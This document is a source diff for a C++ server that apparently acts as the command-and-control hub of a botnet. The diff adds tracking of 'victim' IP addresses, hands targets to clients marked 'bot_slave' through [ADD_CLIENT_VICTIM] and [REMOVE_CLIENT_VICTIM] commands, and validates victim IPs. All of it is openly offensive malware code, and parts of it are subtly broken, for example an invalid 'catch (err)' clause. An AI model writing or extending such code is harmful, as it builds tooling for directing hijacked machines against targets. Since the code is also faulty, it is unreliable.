@@ -130,9 +130,8 @@ void server::handleGetVictimsData(std::string& command, std::vector<std::string>
 
 	std::vector<std::string> output_params = {"1", "[Active_Victims]"};
 
-	std::vector<std::string> victims = {"192.168.0.1", "192.168.0.2", "192.168.0.3", "192.168.0.4", "192.168.0.5"};
-	// TODO:@mark retrieve ^data from real structure
-	for (auto& victim : victims) {
+	for (auto& victim : victims_ips_) {
+		std::cout << victim << "\n";
 		output_params.push_back(victim);
 	}
 
@@ -170,8 +169,40 @@ void server::handleRemoveVictim(std::string& command, std::vector<std::string>& 
 	auto victim = params[1];
 	PRINT("REMOVING VICTIM: ", victim);
 
+	if (!std::count(victims_ips_.begin(), victims_ips_.end(), victim)) {
+		return;
+	}
 
-	// TODO:@mark need to remove the given victim
+	size_t client_id_for_min_victims = -1;
+	std::string client_ip = "";
+
+	for (const auto& cl : clients_data_container_) {
+		if (cl.second.status == "bot_slave") {
+			client_id_for_min_victims = cl.second.id;
+			client_ip = cl.first;
+
+			std::vector<std::string> output_params = {victim};
+			std::string comm = "[REMOVE_CLIENT_VICTIM]";
+			auto client_id_for_min_victims_session =
+			    clients_sessions_container_.find(client_id_for_min_victims)->second;
+			client_id_for_min_victims_session->send(msg_parser_.genCommand(comm, output_params));
+
+			// Update victim info
+			clients_data_container_.find(client_ip)->second.victims--;
+
+			victims_ips_.erase(
+			    std::remove(victims_ips_.begin(),
+					victims_ips_.end(),
+					victim),
+			    victims_ips_.end());
+		}
+	}
+
+	clients_data_container_.find(client_ip)->second.victims_vector.erase(
+	    std::remove(clients_data_container_.find(client_ip)->second.victims_vector.begin(),
+			clients_data_container_.find(client_ip)->second.victims_vector.end(),
+			victim),
+	    clients_data_container_.find(client_ip)->second.victims_vector.end());
 }
 
 void server::handleAddVictim(std::string& command, std::vector<std::string>& params, session* client) {
@@ -182,27 +213,33 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 
 	PRINT("ADDING NEW VICTIM: ", victim_ip);
 
-	size_t client_id_for_min_victims = -1;
-	int min_victims = INT_MAX;
+	if (validate_ip(victim_ip)) {
 
-	for (const auto& cl : clients_data_container_) {
-		if (cl.second.victims < min_victims && cl.second.status == "bot_slave") {
-			min_victims = cl.second.victims;
-			client_id_for_min_victims = cl.second.id;
+		size_t client_id_for_min_victims = -1;
+		std::string client_ip = "";
+
+		for (const auto& cl : clients_data_container_) {
+			if (cl.second.status == "bot_slave") {
+				client_id_for_min_victims = cl.second.id;
+				client_ip = cl.first;
+
+				std::vector<std::string> output_params = {victim_ip};
+				std::string comm = "[ADD_CLIENT_VICTIM]";
+				auto client_id_for_min_victims_session =
+				    clients_sessions_container_.find(client_id_for_min_victims)->second;
+				client_id_for_min_victims_session->send(msg_parser_.genCommand(comm, output_params));
+
+				// Update victim info
+				clients_data_container_.find(client_ip)->second.victims++;
+				clients_data_container_.find(client_ip)->second.victims_vector.push_back(victim_ip);
+			}
 		}
-	}
-
-	if (client_id_for_min_victims) {
-		std::vector<std::string> output_params = {victim_ip};
-		std::string comm = "[ADD_CLIENT_VICTIM]";
-		auto client_id_for_min_victims_session = clients_sessions_container_.find(client_id_for_min_victims)->second;
-		client_id_for_min_victims_session->send(msg_parser_.genCommand(comm, output_params));
 		victims_ips_.push_back(victim_ip);
+
+	} else {
+		std::cout << "WRONG VICTIM IP" << "\n";
 	}
 
-
-
-	// TODO:@mark add new victim to structure + check if given ip is valid address
 }
 
 void server::pingClients() {
@@ -272,5 +309,26 @@ void server::updateMsgCounter_(session* client) {
 bool server::isNumber_(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }
 
 bool server::validate_ip(std::string ip_string) {
+
+	try {
+		std::vector<std::string> victim_ip_port_split;
+		boost::split(victim_ip_port_split, ip_string, boost::is_any_of(":"), boost::token_compress_on);
+		std::vector<std::string> ip_tokens;
+		boost::split(ip_tokens, victim_ip_port_split[0], boost::is_any_of("."), boost::token_compress_on);
+
+		if (ip_tokens.size() != 4) {
+			return false;
+		}
+
+		for (std::string token: ip_tokens)
+		{
+			if (!isNumber_(token) || stoi(token) > 255 || stoi(token) < 0) {
+				return false;
+			}
+		}
+	} catch (err) {
+		return false;
+	}
+
 	return true;
 }
